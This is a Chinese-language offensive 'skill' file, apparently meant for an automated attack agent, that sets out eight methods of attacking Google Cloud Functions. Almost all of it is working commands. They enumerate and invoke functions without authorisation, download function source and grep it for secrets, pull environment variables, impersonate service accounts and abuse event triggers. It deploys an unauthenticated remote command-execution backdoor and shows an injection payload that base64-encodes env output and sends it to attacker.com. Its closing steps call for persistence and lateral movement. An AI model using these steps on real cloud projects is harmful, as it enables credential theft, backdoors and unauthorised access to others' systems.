---
name: gcp-cloudfunctions-attack
type: attack
category: serverless
platform: gcp
severity: high
---

# GCP Cloud Functions 攻击技能

## 触发条件

- 有 GCP 凭证（Service Account Key 或 Access Token）
- 目标项目使用 Cloud Functions
- 用户要求"攻击 GCP Cloud Functions"

## 前置检查

```bash
# 1. 验证凭证
gcloud auth list

# 2. 设置项目
gcloud config set project PROJECT_ID

# 3. 列出所有函数
gcloud functions list
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尝试直接调用函数
curl -X POST https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME \
  -H "Content-Type: application/json" \
  -d '{"test": "data"}'

# 2. 测试 HTTP 触发器
curl https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME

# 3. 枚举函数名
# 常见命名模式: export-*, import-*, process-*, webhook-*, api-*
for name in export-data import-data process-webhook; do
  curl -X POST https://us-central1-PROJECT_ID.cloudfunctions.net/$name
done
```

### 方法 2: 代码注入

```bash
# 1. 获取函数源码
gcloud functions describe FUNCTION_NAME --region=REGION

# 2. 下载源码
gcloud functions download-source FUNCTION_NAME --region=REGION \
  --destination=/tmp/function-source.zip

# 3. 解压并分析
unzip /tmp/function-source.zip -d /tmp/function-source
cd /tmp/function-source
cat *.js *.py 2>/dev/null | grep -E "password|secret|token|key"
```

### 方法 3: 环境变量窃取

```bash
# 1. 列出所有函数及其环境变量
gcloud functions list --format="table(name,region,httpsTrigger.url)"

# 2. 获取特定函数详情
gcloud functions describe FUNCTION_NAME --region=REGION \
  --format="json" | jq '.environmentVariables'

# 3. 触发函数以获取环境信息
curl -X POST https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME \
  -H "Content-Type: application/json" \
  -d '{"cmd": "env"}'
```

### 方法 4: IAM 权限滥用

```bash
# 1. 检查函数的 Service Account
gcloud functions describe FUNCTION_NAME --region=REGION \
  --format="json" | jq '.serviceAccountEmail'

# 2. 伪装成 Service Account
# 如果你有该 SA 的 Impersonate 权限
gcloud iam service-accounts impersonate SA_NAME@PROJECT_ID.iam.gserviceaccount.com \
  --project=PROJECT_ID

# 3. 使用 SA 凭证调用函数
curl -X POST https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"admin": true}'
```

### 方法 5: Event Trigger 滥用

```bash
# 1. 列出函数的触发器
gcloud functions describe FUNCTION_NAME --region=REGION \
  --format="json" | jq '.eventTrigger'

# 2. 触发 Pub/Sub 事件
# 如果函数监听 Pub/Sub topic
gcloud pubsub topics publish TOPIC_NAME "malicious-payload"

# 3. 触发 Storage 事件
# 上传文件到触发 Bucket
echo "malicious data" | gsutil cp - gs://TRIGGER_BUCKET/malicious.txt
```

### 方法 6: 部署恶意函数

```bash
# 1. 创建恶意函数
cat > index.js <<'EOF'
exports.maliciousFunction = (req, res) => {
  const { exec } = require('child_process');
  const cmd = req.body.cmd || 'whoami';
  exec(cmd, (error, stdout) => {
    if (error) {
      res.status(500).send(error.message);
      return;
    }
    res.send(stdout);
  });
};
EOF

# 2. 部署函数
gcloud functions deploy malicious-backdoor \
  --runtime=nodejs18 \
  --trigger-http \
  --allow-unauthenticated \
  --region=REGION

# 3. 调用后门函数
curl -X POST https://REGION-PROJECT_ID.cloudfunctions.net/malicious-backdoor \
  -H "Content-Type: application/json" \
  -d '{"cmd": "cat /etc/passwd"}'
```

### 方法 7: 日志注入攻击

```bash
# 1. 触发函数并注入恶意日志
curl -X POST https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME \
  -H "Content-Type: application/json" \
  -d '{"input": "$(curl https://attacker.com/exfil?data=$(env|base64))"}'

# 2. 读取日志获取敏感信息
gcloud logging read "resource.type=cloud_function AND resource.labels.function_name=FUNCTION_NAME" \
  --limit=100 --format=json | jq -r '.[].logName'
```

### 方法 8: Cross-Project 攻击

```bash
# 1. 如果有跨项目调用权限
gcloud functions describe FUNCTION_NAME --region=REGION \
  --format="json" | jq '.ingressSettings'

# 2. 从另一个项目调用
curl -X POST https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME \
  -H "Authorization: Bearer OTHER_PROJECT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cross-project": "attack"}'
```

## 验证成功

```bash
# 成功调用函数
curl -w "\nHTTP Status: %{http_code}\n" \
  -X POST https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME \
  -H "Content-Type: application/json" \
  -d '{}'

# 成功下载源码
ls -lh /tmp/function-source.zip

# 成功获取环境变量
gcloud functions describe FUNCTION_NAME --region=REGION \
  --format="value(environmentVariables)"
```

## 下一步

1. 分析函数代码中的密钥和凭证
2. 使用获取的凭证访问其他 GCP 服务
3. 通过 Cloud Functions 建立持久化后门
4. 横向移动到其他 Cloud Functions
